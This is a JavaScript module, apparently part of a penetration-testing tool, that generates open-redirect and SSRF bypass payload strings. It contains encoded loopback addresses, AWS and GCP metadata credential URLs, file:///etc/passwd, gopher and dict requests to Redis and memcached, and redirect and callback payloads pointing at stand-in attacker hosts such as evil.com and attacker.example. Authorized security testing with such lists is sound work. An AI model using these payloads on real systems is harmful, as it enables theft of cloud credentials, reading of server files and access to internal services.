// Redirect & SSRF Payloads — pure, DOM-free core. Given an attacker-controlled
// host and (optionally) the target host, generate classic open-redirect and
// SSRF filter-bypass strings to drop into a redirect/url parameter during an
// authorized test. Generation only — nothing is sent. DOM-free for `node --test`.

// Strip scheme / path, keep host[:port]. Empty-safe.
function hostOnly(input) {
  let s = String(input || '').trim();
  s = s.replace(/^[a-z][a-z0-9+.-]*:\/\//i, '');
  s = s.split('/')[0].split('?')[0].split('#')[0];
  return s;
}

// Open-redirect bypass payloads aimed at an `attacker` host. `target` (the
// vulnerable site's host) seeds payloads that try to look same-origin.
export function openRedirectPayloads(attacker, target = 'victim.com') {
  const a = hostOnly(attacker) || 'evil.com';
  const t = hostOnly(target) || 'victim.com';
  return [
    `https://${a}`,
    `http://${a}`,
    `//${a}`,
    `///${a}`,
    `\\/\\/${a}`,
    `/\\${a}`,
    `https:/${a}`,
    `https:\\\\${a}`,
    `https://${t}@${a}`,
    `https://${a}#${t}`,
    `https://${a}?${t}`,
    `https://${a}\\.${t}`,
    `https://${t}.${a}`,
    `https://${a}%2f%2f`,
    `%2f%2f${a}`,
    `/%09/${a}`,
    `https://${a}%00.${t}`,
  ];
}

// SSRF bypass payloads for reaching internal/metadata services. `attacker` is
// used for the out-of-band exfil case.
export function ssrfPayloads(attacker) {
  const a = hostOnly(attacker) || 'attacker.example';
  return [
    'http://127.0.0.1/',
    'http://127.0.0.1:80/',
    'http://localhost/',
    'http://0.0.0.0/',
    'http://[::1]/',
    'http://0177.0.0.1/',      // octal
    'http://2130706433/',      // decimal 127.0.0.1
    'http://0x7f.0.0.1/',      // hex
    'http://127.1/',           // short form
    'http://127.0.0.1.nip.io/',
    'http://169.254.169.254/latest/meta-data/',          // AWS IMDS
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/', // GCP
    'http://[fd00:ec2::254]/latest/meta-data/',
    `http://${a}/ssrf-callback`,                          // OOB confirm
    'file:///etc/passwd',
    'gopher://127.0.0.1:6379/_INFO',                      // Redis via gopher
    'dict://127.0.0.1:11211/stat',                        // memcached
  ];
}

// Both sets keyed by group, for a single render call.
export function allPayloads(attacker, target) {
  return {
    'Open redirect': openRedirectPayloads(attacker, target),
    SSRF: ssrfPayloads(attacker),
  };
}
